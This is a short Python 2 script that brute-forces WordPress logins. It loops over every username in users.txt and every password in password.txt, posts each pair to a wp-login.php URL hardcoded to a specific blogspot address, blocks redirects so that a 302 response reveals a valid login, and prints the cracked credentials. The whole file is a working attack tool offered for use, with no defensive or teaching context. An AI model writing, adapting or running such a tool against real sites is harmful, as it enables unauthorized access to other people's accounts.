import urllib
import urllib2
import re

user_agent=('User-Agent','''Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0''')
url='http://ifrouter.blogspot.com/wp-login.php'

class StopRedirectHandler(urllib2.HTTPRedirectHandler):
     def http_error_301(self,req,fp,code,msg,headers):
         pass
     def http_error_302(self,req,fp,code,msg,headers):
        pass
    
def read_info(user_file,pass_file):
    with open(user_file) as fi_u:
        lu= [ i.strip() for i in fi_u.readlines()]
    with open(pass_file) as fi_p:
        lp= [ i.strip() for i in fi_p.readlines()]
    return (lu,lp)

def wp_login(url,users,pwd):
    post_data=urllib.urlencode({'log':users,'pwd':pwd})
    
    try:
        print "try password : %s" %pwd
        repose = opener.open(url, data=post_data,timeout=18)
        repose_html= repose.read()
        if re.search('Lost your password', repose_html, re.I ) != None :
            return False
    except urllib2.HTTPError as e:
        if e.code==302:
            print 'users is: %s ; password is: %s' % (users,pwd)
            return True
        else : 
            print e
            return False
    except Exception  as e:
        print e
        return False
if __name__ == '__main__':
    opener = urllib2.build_opener(StopRedirectHandler)
    opener.addheaders = [(user_agent)]
    users,passwords = read_info('users.txt','password.txt')
    print 'start crack...'
    for user in users:
        for pwd in passwords:
            post_data=urllib.urlencode({'log':user,'pwd':pwd})
            if wp_login(url, user, pwd) :
                exit()
    print 'crack end!!!'
    
    
